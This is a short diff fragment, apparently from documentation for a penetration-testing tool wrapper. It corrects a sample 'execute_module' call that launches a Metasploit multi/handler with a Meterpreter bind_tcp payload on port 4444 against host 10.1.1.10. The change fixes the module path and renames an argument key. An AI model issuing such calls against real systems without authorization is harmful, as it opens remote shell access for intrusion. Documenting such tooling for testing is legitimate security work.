@@ -19,10 +19,10 @@ To do so:
   tool: "execute_module"
   args: {
     lport: 4444
-    module_name: "multi/handler"
+    module_name: "exploit/multi/handler"
     module_type: "exploit"
     payload: "windows/x64/meterpreter/bind_tcp"
-    RHOST: "10.1.1.10"
+    rhost: "10.1.1.10"
     verbose: true
   }
 }
